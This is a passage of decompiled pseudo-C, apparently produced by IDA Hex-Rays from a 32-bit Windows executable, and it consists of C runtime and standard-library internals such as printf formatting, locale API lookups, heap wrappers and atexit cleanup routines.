    v8 = (unsigned __int64)-__SPAIR64__(v8, v7) >> 32;
    *(_DWORD *)(this + 32) |= 0x40u;
  }
  if ( *(int *)(this + 40) >= 0 )
  {
    v17 = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 32) &= ~8u;
    __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(v17);
  }
  else
  {
    *(_DWORD *)(this + 40) = 1;
  }
  if ( !(v8 | v7) )
    *(_DWORD *)(this + 32) &= ~0x20u;
  *(_BYTE *)(this + 60) = 0;
  if ( v18 == 8 )
    unknown_libname_11(v7, v8, a2, a3);
  else
    unknown_libname_10(v7, a2, a3);
  if ( (*(_DWORD *)(this + 32) & 0x80) != 0 && (!*(_DWORD *)(this + 56) || **(_BYTE **)(this + 52) != 48) )
  {
    *(_BYTE *)--*(_DWORD *)(this + 52) = 48;
    ++*(_DWORD *)(this + 56);
  }
  return 1;
}
// 41A443: using guessed type _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD);
// 41A511: using guessed type _DWORD __stdcall unknown_libname_10(_DWORD, _DWORD, char);
// 41A57E: using guessed type _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD, _DWORD, char);
// 41B60B: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (0041BA7D) --------------------------------------------------------
char __thiscall sub_41BA7D(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_41B8B8((int)this, 8, 0);
}

//----- (0041BA9C) --------------------------------------------------------
char __thiscall sub_41BA9C(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_41B8B8((int)this, 16, 1);
}

//----- (0041BEE7) --------------------------------------------------------
int __cdecl sub_41BEE7(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7[5]; // [esp+0h] [ebp-38h] BYREF
  int v8[2]; // [esp+14h] [ebp-24h] BYREF
  int v9; // [esp+1Ch] [ebp-1Ch] BYREF
  int v10; // [esp+20h] [ebp-18h] BYREF
  int v11; // [esp+24h] [ebp-14h] BYREF
  int v12; // [esp+28h] [ebp-10h] BYREF
  int v13; // [esp+2Ch] [ebp-Ch] BYREF
  int v14; // [esp+30h] [ebp-8h] BYREF

  v11 = a6;
  v13 = a5;
  v8[0] = a1;
  v12 = a4;
  v14 = a3;
  v8[1] = a2;
  if ( a3 && a4 )
  {
    v10 = a3;
    v7[0] = (int)&v14;
    v7[1] = (int)&v13;
    v7[2] = (int)v8;
    v7[3] = (int)&v12;
    v7[4] = (int)&v11;
    v9 = a3;
    return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
             &v9,
             v7,
             &v10);
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 41A062: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);

//----- (0041BF6C) --------------------------------------------------------
int __cdecl sub_41BF6C(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  return sub_41A233(a1, a2, a3, a4, a5, a6, a7);
}

//----- (0041C3A1) --------------------------------------------------------
int sub_41C3A1()
{
  return common_flush_all(1);
}

//----- (0041DA67) --------------------------------------------------------
int __cdecl sub_41DA67(int a1)
{
  int result; // eax

  result = a1;
  dword_453028 = a1;
  return result;
}
// 453028: using guessed type int dword_453028;

//----- (0041F711) --------------------------------------------------------
int __cdecl sub_41F711(int a1)
{
  int result; // eax

  result = a1;
  dword_45318C = a1;
  return result;
}
// 45318C: using guessed type int dword_45318C;

//----- (0041FC39) --------------------------------------------------------
int sub_41FC39()
{
  int result; // eax

  result = dword_45339C;
  if ( !dword_45339C )
  {
    if ( !dword_4533A0
      || common_initialize_environment_nolock<char>() && initialize_environment_by_cloning_nolock<char>() )
    {
      return 0;
    }
    else
    {
      return dword_45339C;
    }
  }
  return result;
}
// 41FC65: using guessed type int common_initialize_environment_nolock<char>(void);
// 41FF00: using guessed type int initialize_environment_by_cloning_nolock<char>(void);
// 45339C: using guessed type int dword_45339C;
// 4533A0: using guessed type int dword_4533A0;

//----- (0041FFBF) --------------------------------------------------------
void *__cdecl sub_41FFBF(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_4533A8 )
    return (void *)unknown_libname_34(*a1);
  return result;
}

//----- (0041FFDA) --------------------------------------------------------
void *__cdecl sub_41FFDA(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_4533A4 )
    return (void *)unknown_libname_34(*a1);
  return result;
}

//----- (0042033D) --------------------------------------------------------
int __cdecl sub_42033D(_onexit_t Function)
{
  return _register_onexit_function(&stru_4533AC, Function);
}

//----- (004203F4) --------------------------------------------------------
char sub_4203F4()
{
  dword_4533DC = (struct __crt_locale_data *)&off_4471E0;
  return 1;
}
// 4471E0: using guessed type wchar_t *off_4471E0;

//----- (0042041B) --------------------------------------------------------
char sub_42041B()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 41FFFA: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (00420460) --------------------------------------------------------
__vcrt_bool sub_420460()
{
  return __vcrt_uninitialize(0);
}

//----- (00420542) --------------------------------------------------------
int sub_420542()
{
  return dword_4533C4;
}
// 4533C4: using guessed type int dword_4533C4;

//----- (00420548) --------------------------------------------------------
int __cdecl sub_420548(int a1)
{
  int result; // eax

  result = a1;
  dword_4533C4 = a1;
  return result;
}
// 4533C4: using guessed type int dword_4533C4;

//----- (0042056F) --------------------------------------------------------
int __cdecl sub_42056F(int a1)
{
  int result; // eax

  result = a1;
  dword_4533C8 = a1;
  return result;
}
// 4533C8: using guessed type int dword_4533C8;

//----- (004206C9) --------------------------------------------------------
int __cdecl sub_4206C9(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_4537E4;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 4537E4: using guessed type int dword_4537E4;

//----- (00420AB5) --------------------------------------------------------
__int32 sub_420AB5()
{
  return _InterlockedExchange(&dword_4533D0, 1);
}
// 4533D0: using guessed type int dword_4533D0;

//----- (004219A0) --------------------------------------------------------
int sub_4219A0()
{
  return dword_4533D4;
}
// 4533D4: using guessed type int dword_4533D4;

//----- (004219D5) --------------------------------------------------------
int *sub_4219D5()
{
  return &dword_4533D8;
}
// 4533D8: using guessed type int dword_4533D8;

//----- (00421A3A) --------------------------------------------------------
char *__cdecl sub_421A3A(void *Block, unsigned int a2, unsigned int a3)
{
  SIZE_T v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = sub_42D939(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (004224CB) --------------------------------------------------------
char **sub_4224CB()
{
  return off_43A6A8;
}
// 43A6A8: using guessed type char *off_43A6A8[44];

//----- (004224D1) --------------------------------------------------------
const char *sub_4224D1()
{
  return "+";
}

//----- (00423A30) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_423A30(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_4533DC )
  {
    result = (struct __crt_locale_data *)dword_4472DC;
    if ( (dword_4472DC & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 42C0FB: using guessed type int __acrt_update_thread_locale_data(void);
// 4472DC: using guessed type int dword_4472DC;

//----- (00423A5D) --------------------------------------------------------
struct __crt_multibyte_data *__cdecl sub_423A5D(int a1, struct __crt_multibyte_data **a2)
{
  struct __crt_multibyte_data *result; // eax

  result = *a2;
  if ( *a2 != dword_4537C0 )
  {
    result = (struct __crt_multibyte_data *)dword_4472DC;
    if ( (dword_4472DC & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = sub_42A959();
      *a2 = result;
    }
  }
  return result;
}
// 4472DC: using guessed type int dword_4472DC;

//----- (00423A8A) --------------------------------------------------------
BOOL __stdcall LocaleEnumProc(LPWSTR a1)
{
  return unknown_libname_41(a1);
}
// 423B1B: using guessed type _DWORD __stdcall unknown_libname_41(_DWORD);

//----- (00423BC9) --------------------------------------------------------
int sub_423BC9()
{
  return try_get_function(11, "GetLocaleInfoEx", &unk_43B428, &unk_43B430);
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423BE3) --------------------------------------------------------
int sub_423BE3()
{
  return try_get_function(14, "GetTimeFormatEx", &unk_43B430, "GetTimeFormatEx");
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423BFD) --------------------------------------------------------
int sub_423BFD()
{
  return try_get_function(15, "GetUserDefaultLocaleName", &unk_43B448, "GetUserDefaultLocaleName");
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423C17) --------------------------------------------------------
int sub_423C17()
{
  return try_get_function(19, "IsValidLocaleName", &unk_43B474, "IsValidLocaleName");
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423C31) --------------------------------------------------------
int sub_423C31()
{
  return try_get_function(21, "LCIDToLocaleName", &unk_43B498, "LCIDToLocaleName");
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423C4B) --------------------------------------------------------
int sub_423C4B()
{
  return try_get_function(20, "LCMapStringEx", &unk_43B490, &unk_43B498);
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00423C65) --------------------------------------------------------
int sub_423C65()
{
  return try_get_function(22, "LocaleNameToLCID", &unk_43B4B4, "LocaleNameToLCID");
}
// 423D47: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00424243) --------------------------------------------------------
int __stdcall sub_424243(
        wchar_t *a1,
        DWORD dwMapFlags,
        LPCWSTR lpSrcStr,
        int cchSrc,
        LPWSTR lpDestStr,
        int cchDest,
        int a7,
        int a8,
        int a9)
{
  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int); // eax
  LCID v11; // eax

  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int))sub_423C4B();
  if ( v9 )
    return v9(v9, a1, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, a7, a8, a9);
  v11 = __acrt_LocaleNameToLCID(a1, 0);
  return LCMapStringW(v11, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);
}

//----- (00425802) --------------------------------------------------------
int __cdecl sub_425802(int a1)
{
  int v2; // [esp+4h] [ebp-10h] BYREF
  int *v3; // [esp+8h] [ebp-Ch] BYREF
  int v4; // [esp+Ch] [ebp-8h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_4536C0
      && ((int)lpCriticalSection[a1 >> 6][2 * (a1 & 0x3F) + 1].LockSemaphore & 1) != 0 )
    {
      v4 = a1;
      v3 = &a1;
      v2 = a1;
      return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
               &v2,
               &v3,
               &v4);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 425780: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 4534C0: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 4536C0: using guessed type int dword_4536C0;
// 425802: using guessed type int var_8;

//----- (00427BB7) --------------------------------------------------------
char sub_427BB7()
{
  hHeap = 0;
  return 1;
}

//----- (0042964C) --------------------------------------------------------
int *sub_42964C()
{
  return &dword_4536EC;
}
// 4536EC: using guessed type int dword_4536EC;

//----- (00429652) --------------------------------------------------------
int *sub_429652()
{
  return &dword_4536F0;
}
// 4536F0: using guessed type int dword_4536F0;

//----- (00429658) --------------------------------------------------------
int *sub_429658()
{
  return &dword_4536E8;
}
// 4536E8: using guessed type int dword_4536E8;

//----- (0042965E) --------------------------------------------------------
int sub_42965E()
{
  return dword_4536F4;
}
// 4536F4: using guessed type int dword_4536F4;

//----- (00429664) --------------------------------------------------------
int __cdecl sub_429664(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_4536EC;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 4536EC: using guessed type int dword_4536EC;

//----- (00429690) --------------------------------------------------------
int __cdecl sub_429690(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_4536F0;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 4536F0: using guessed type int dword_4536F0;

//----- (004296BC) --------------------------------------------------------
int __cdecl sub_4296BC(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_4536E8;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 4536E8: using guessed type int dword_4536E8;

//----- (0042A959) --------------------------------------------------------
struct __crt_multibyte_data *sub_42A959()
{
  struct __acrt_ptd *v0; // eax

  v0 = (struct __acrt_ptd *)__acrt_getptd();
  return update_thread_multibyte_data_internal(v0, &dword_4537C0);
}
// 4237E9: using guessed type int __acrt_getptd(void);

//----- (0042AFFA) --------------------------------------------------------
int sub_42AFFA()
{
  int result; // eax

  result = dword_45339C;
  if ( (void *)dword_45339C == dword_4533A8 )
  {
    result = copy_environment<char>(dword_45339C);
    dword_45339C = result;
  }
  return result;
}
// 42AF49: using guessed type _DWORD __cdecl copy_environment<char>(_DWORD);
// 45339C: using guessed type int dword_45339C;

//----- (0042D939) --------------------------------------------------------
SIZE_T __cdecl sub_42D939(LPCVOID lpMem)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( lpMem )
    return HeapSize(hHeap, 0, lpMem);
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return -1;
}

//----- (00431C1D) --------------------------------------------------------
BOOL sub_431C1D()
{
  char *v0; // ecx

  v0 = (char *)hConsoleOutput;
  if ( hConsoleOutput == (HANDLE)-2 )
  {
    __dcrt_lowio_initialize_console_output();
    v0 = (char *)hConsoleOutput;
  }
  return v0 + 1 != 0;
}

//----- (00432714) --------------------------------------------------------
int __cdecl sub_432714(double a1)
{
  return _ceil_default(a1);
}

//----- (00434650) --------------------------------------------------------
void __cdecl sub_434650()
{
  sub_401AB0(*((_DWORD **)Block + 1));
  *((_DWORD *)Block + 1) = Block;
  *(_DWORD *)Block = Block;
  *((_DWORD *)Block + 2) = Block;
  dword_453830 = 0;
  j__free(Block);
}
// 453830: using guessed type int dword_453830;

//----- (004346D0) --------------------------------------------------------
void __cdecl sub_4346D0()
{
  sub_401AB0(*((_DWORD **)dword_453824 + 1));
  *((_DWORD *)dword_453824 + 1) = dword_453824;
  *(_DWORD *)dword_453824 = dword_453824;
  *((_DWORD *)dword_453824 + 2) = dword_453824;
  dword_453828 = 0;
  j__free(dword_453824);
}
// 453828: using guessed type int dword_453828;

//----- (00434750) --------------------------------------------------------
void __cdecl sub_434750()
{
  sub_401AB0(*((_DWORD **)dword_45383C + 1));
  *((_DWORD *)dword_45383C + 1) = dword_45383C;
  *(_DWORD *)dword_45383C = dword_45383C;
  *((_DWORD *)dword_45383C + 2) = dword_45383C;
  dword_453840 = 0;
  j__free(dword_45383C);
}
// 453840: using guessed type int dword_453840;

//----- (004347D0) --------------------------------------------------------
void __cdecl sub_4347D0()
{
  sub_401AB0(*((_DWORD **)dword_453834 + 1));
  *((_DWORD *)dword_453834 + 1) = dword_453834;
  *(_DWORD *)dword_453834 = dword_453834;
  *((_DWORD *)dword_453834 + 2) = dword_453834;
  dword_453838 = 0;
  j__free(dword_453834);
}
// 453838: using guessed type int dword_453838;

//----- (00434850) --------------------------------------------------------
void __cdecl sub_434850()
{
  void *v0; // ecx
  unsigned int v1; // eax

  if ( (unsigned int)dword_452154 >= 0x10 )
  {
    v0 = Src;
    if ( (unsigned int)(dword_452154 + 1) >= 0x1000 )
    {
      if ( ((unsigned __int8)Src & 0x1F) != 0
        || (v1 = *((_DWORD *)Src - 1), v1 >= (unsigned int)Src)
        || (char *)Src - v1 < (char *)4
        || (char *)Src - v1 > (char *)0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v0 = (void *)*((_DWORD *)Src - 1);
    }
    j__free(v0);
  }
  dword_452150 = 0;
  dword_452154 = 15;
  LOBYTE(Src) = 0;
}
// 401AA0: using guessed type _DWORD _guard_check_icall_nop();
// 452150: using guessed type int dword_452150;
// 452154: using guessed type int dword_452154;

//----- (004348C0) --------------------------------------------------------
void __cdecl sub_4348C0()
{
  sub_401AB0(*((_DWORD **)dword_45384C + 1));
  *((_DWORD *)dword_45384C + 1) = dword_45384C;
  *(_DWORD *)dword_45384C = dword_45384C;
  *((_DWORD *)dword_45384C + 2) = dword_45384C;
  dword_453850 = 0;
  j__free(dword_45384C);
}
// 453850: using guessed type int dword_453850;

//----- (00434940) --------------------------------------------------------
void __cdecl sub_434940()
{
  sub_401AB0(*((_DWORD **)dword_453844 + 1));
  *((_DWORD *)dword_453844 + 1) = dword_453844;
  *(_DWORD *)dword_453844 = dword_453844;
  *((_DWORD *)dword_453844 + 2) = dword_453844;
  dword_453848 = 0;
  j__free(dword_453844);
}
// 453848: using guessed type int dword_453848;

//----- (004349C0) --------------------------------------------------------
void __cdecl sub_4349C0()
{
  void *v0; // ecx
  unsigned int v1; // eax

  if ( (unsigned int)dword_452184 >= 0x10 )
  {
    v0 = dword_452170;
    if ( (unsigned int)(dword_452184 + 1) >= 0x1000 )
    {
      if ( ((unsigned __int8)dword_452170 & 0x1F) != 0
        || (v1 = *((_DWORD *)dword_452170 - 1), v1 >= (unsigned int)dword_452170)
        || (char *)dword_452170 - v1 < (char *)4
        || (char *)dword_452170 - v1 > (char *)0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v0 = (void *)*((_DWORD *)dword_452170 - 1);
    }
    j__free(v0);
  }
  dword_452180 = 0;
  dword_452184 = 15;
  LOBYTE(dword_452170) = 0;
}
// 401AA0: using guessed type _DWORD _guard_check_icall_nop();
// 452180: using guessed type int dword_452180;
// 452184: using guessed type int dword_452184;

//----- (00434A30) --------------------------------------------------------
void __cdecl sub_434A30()
{
  void *v0; // ecx
  unsigned int v1; // eax

  if ( (unsigned int)dword_45216C >= 0x10 )
  {
    v0 = dword_452158;
    if ( (unsigned int)(dword_45216C + 1) >= 0x1000 )
    {
      if ( ((unsigned __int8)dword_452158 & 0x1F) != 0
        || (v1 = *((_DWORD *)dword_452158 - 1), v1 >= (unsigned int)dword_452158)
        || (char *)dword_452158 - v1 < (char *)4
        || (char *)dword_452158 - v1 > (char *)0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v0 = (void *)*((_DWORD *)dword_452158 - 1);
    }
    j__free(v0);
  }
  dword_452168 = 0;
  dword_45216C = 15;
  LOBYTE(dword_452158) = 0;
}
// 401AA0: using guessed type _DWORD _guard_check_icall_nop();
// 452168: using guessed type int dword_452168;
// 45216C: using guessed type int dword_45216C;

//----- (00434AA0) --------------------------------------------------------
void __cdecl sub_434AA0()
{
  sub_401AB0(*((_DWORD **)dword_45385C + 1));
  *((_DWORD *)dword_45385C + 1) = dword_45385C;
  *(_DWORD *)dword_45385C = dword_45385C;
  *((_DWORD *)dword_45385C + 2) = dword_45385C;
  dword_453860 = 0;
  j__free(dword_45385C);
}
// 453860: using guessed type int dword_453860;

//----- (00434B20) --------------------------------------------------------
void __cdecl sub_434B20()
{
  sub_401AB0(*((_DWORD **)dword_453854 + 1));
  *((_DWORD *)dword_453854 + 1) = dword_453854;
  *(_DWORD *)dword_453854 = dword_453854;
  *((_DWORD *)dword_453854 + 2) = dword_453854;
  dword_453858 = 0;
  j__free(dword_453854);
}
// 453858: using guessed type int dword_453858;

//----- (00434BA0) --------------------------------------------------------
void __cdecl sub_434BA0()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_447000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_452860;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&dword_452920 );
  }
}
// 447000: using guessed type int dword_447000;

//----- (00434BAA) --------------------------------------------------------
void __cdecl sub_434BAA()
{
  std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t((std::_Fac_tidy_reg_t *)&unk_45294C);
}

//----- (00434BB4) --------------------------------------------------------
void __cdecl sub_434BB4()
{
  sub_403D60(&dword_452944);
}
// 452944: using guessed type _DWORD dword_452944;

//----- (00434BBE) --------------------------------------------------------
void __cdecl sub_434BBE()
{
  sub_40B2C0((char *)dword_452990);
}
// 452990: using guessed type int dword_452990[5];

//----- (00434BC8) --------------------------------------------------------
void __cdecl sub_434BC8()
{
  sub_40A7C0(dword_4529E0);
}
// 4529E0: using guessed type int dword_4529E0[22];

//----- (00434BD2) --------------------------------------------------------
void __cdecl sub_434BD2()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_447000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_452860;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&dword_452920 );
  }
}
// 447000: using guessed type int dword_447000;

//----- (00434BDC) --------------------------------------------------------
void __cdecl sub_434BDC()
{
  _Init_atexit::~_Init_atexit((_Init_atexit *)&unk_452B21);
}

//----- (00434BE6) --------------------------------------------------------
void __cdecl sub_434BE6()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(&dword_447000, 0xFFFFFFFF) < 0 )
  {
    v0 = &stru_452860;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&dword_452920 );
  }
}
// 447000: using guessed type int dword_447000;

//----- (00434BF0) --------------------------------------------------------
void __cdecl sub_434BF0()
{
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)&unk_452F30 + 20));
  if ( *((_DWORD *)&unk_452F30 + 11) )
  {
    free(*((void **)&unk_452F30 + 11));
    *((_DWORD *)&unk_452F30 + 11) = 0;
  }
  *((_DWORD *)&unk_452F30 + 12) = 0;
  *((_DWORD *)&unk_452F30 + 13) = 0;
}
// 434BF0: could not find valid save-restore pair for esi

// nfuncs=1181 queued=370 decompiled=370 lumina nreq=0 worse=0 better=0
// ALL OK, 370 function(s) have been successfully decompiled
